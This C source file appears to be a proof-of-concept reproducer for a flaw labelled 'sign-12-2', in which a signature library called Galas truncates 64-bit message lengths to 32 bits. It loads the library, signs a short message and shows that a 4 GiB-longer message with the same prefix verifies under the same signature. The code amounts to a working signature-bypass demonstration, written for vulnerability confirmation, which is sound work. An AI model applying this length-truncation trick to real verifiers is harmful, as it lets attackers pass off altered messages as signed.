/* Reproduce sign-12-2: Galas truncates 64-bit message lengths to 32 bits.
 *
 * The 4 GiB suffix is only virtually mapped. Because the vulnerable code
 * hashes only the first 38 bytes, the test commits two pages rather than
 * reading or allocating 4 GiB of physical memory.
 */
#define _GNU_SOURCE
#include <dlfcn.h>
#include <errno.h>
#include <inttypes.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>

typedef unsigned long long (*get_len_fn)(void);
typedef int (*keygen_fn)(unsigned char *, unsigned long long *,
                         unsigned char *, unsigned long long *);
typedef int (*sign_fn)(unsigned char *, unsigned long long,
                       unsigned char *, unsigned long long,
                       unsigned char *, unsigned long long *);
typedef int (*verify_fn)(unsigned char *, unsigned long long,
                         unsigned char *, unsigned long long,
                         unsigned char *, unsigned long long);

static void *required_symbol(void *handle, const char *name)
{
    void *symbol;
    dlerror();
    symbol = dlsym(handle, name);
    const char *error = dlerror();
    if (error != NULL) {
        fprintf(stderr, "%s: %s\n", name, error);
        exit(2);
    }
    return symbol;
}

static const char *verdict(int rc)
{
    return rc == 0 ? "ACCEPTED" : "rejected";
}

int main(int argc, char **argv)
{
    enum { SHORT_LEN = 38 };
    const uint64_t long_len_u64 = (UINT64_C(1) << 32) + SHORT_LEN;
    if (argc != 2) {
        fprintf(stderr, "usage: %s LIBRARY\n", argv[0]);
        return 2;
    }
    if (sizeof(size_t) < sizeof(uint64_t) || long_len_u64 > SIZE_MAX) {
        fprintf(stderr, "this reproducer requires a 64-bit address space\n");
        return 2;
    }
    if (sizeof(unsigned) != sizeof(uint32_t)) {
        fprintf(stderr, "this reproducer targets builds with 32-bit unsigned\n");
        return 2;
    }

    void *handle = dlopen(argv[1], RTLD_NOW | RTLD_LOCAL);
    if (handle == NULL) {
        fprintf(stderr, "%s: %s\n", argv[1], dlerror());
        return 2;
    }
    get_len_fn get_pk_len = (get_len_fn)required_symbol(handle, "sig_get_pk_len_bytes");
    get_len_fn get_sk_len = (get_len_fn)required_symbol(handle, "sig_get_sk_len_bytes");
    get_len_fn get_sn_len = (get_len_fn)required_symbol(handle, "sig_get_sn_len_bytes");
    keygen_fn keygen = (keygen_fn)required_symbol(handle, "sig_keygen");
    sign_fn sign = (sign_fn)required_symbol(handle, "sig_sign");
    verify_fn verify = (verify_fn)required_symbol(handle, "sig_verify");

    unsigned long long pk_len = get_pk_len();
    unsigned long long sk_len = get_sk_len();
    unsigned long long sn_len = get_sn_len();
    unsigned char *pk = calloc((size_t)pk_len, 1);
    unsigned char *sk = calloc((size_t)sk_len, 1);
    unsigned char *sn = calloc((size_t)sn_len, 1);
    if (pk == NULL || sk == NULL || sn == NULL) {
        fprintf(stderr, "allocation failed\n");
        return 2;
    }

    unsigned char short_msg[SHORT_LEN];
    for (size_t i = 0; i < sizeof short_msg; ++i)
        short_msg[i] = (unsigned char)(0x41u + i);

    unsigned long long got_pk = pk_len, got_sk = sk_len, got_sn = sn_len;
    int kg = keygen(pk, &got_pk, sk, &got_sk);
    int sg = kg == 0 ? sign(sk, got_sk, short_msg, SHORT_LEN, sn, &got_sn) : -99;
    if (kg != 0 || sg != 0) {
        fprintf(stderr, "keygen/sign failed: keygen=%d sign=%d\n", kg, sg);
        return 2;
    }

    size_t long_len = (size_t)long_len_u64;
    unsigned char *long_msg = mmap(NULL, long_len, PROT_READ | PROT_WRITE,
                                   MAP_PRIVATE | MAP_ANONYMOUS | MAP_NORESERVE,
                                   -1, 0);
    if (long_msg == MAP_FAILED) {
        fprintf(stderr, "mmap(%" PRIu64 "): %s\n", long_len_u64,
                strerror(errno));
        return 2;
    }
    memcpy(long_msg, short_msg, SHORT_LEN);
    long_msg[long_len - 1] = 0x5a;

    int short_rc = verify(pk, got_pk, sn, got_sn, short_msg, SHORT_LEN);
    int long_rc = verify(pk, got_pk, sn, got_sn, long_msg, long_len_u64);
    long_msg[long_len - 1] ^= 0xff;
    int suffix_rc = verify(pk, got_pk, sn, got_sn, long_msg, long_len_u64);
    long_msg[0] ^= 0x80;
    int prefix_rc = verify(pk, got_pk, sn, got_sn, long_msg, long_len_u64);

    printf("library=%s\n", argv[1]);
    printf("short_length=%u long_length=%" PRIu64 "\n", SHORT_LEN, long_len_u64);
    printf("short_message=%s (rc=%d)\n", verdict(short_rc), short_rc);
    printf("long_same_prefix=%s (rc=%d)\n", verdict(long_rc), long_rc);
    printf("long_suffix_changed=%s (rc=%d)\n", verdict(suffix_rc), suffix_rc);
    printf("long_prefix_changed=%s (rc=%d)\n", verdict(prefix_rc), prefix_rc);

    int confirmed = short_rc == 0 && long_rc == 0 && suffix_rc == 0 && prefix_rc != 0;
    printf("%s sign-12-2: 2^32-byte suffix is not bound to the signature\n",
           confirmed ? "CONFIRMED" : "NOT-CONFIRMED");

    munmap(long_msg, long_len);
    free(pk);
    free(sk);
    free(sn);
    dlclose(handle);
    return confirmed ? 0 : 1;
}
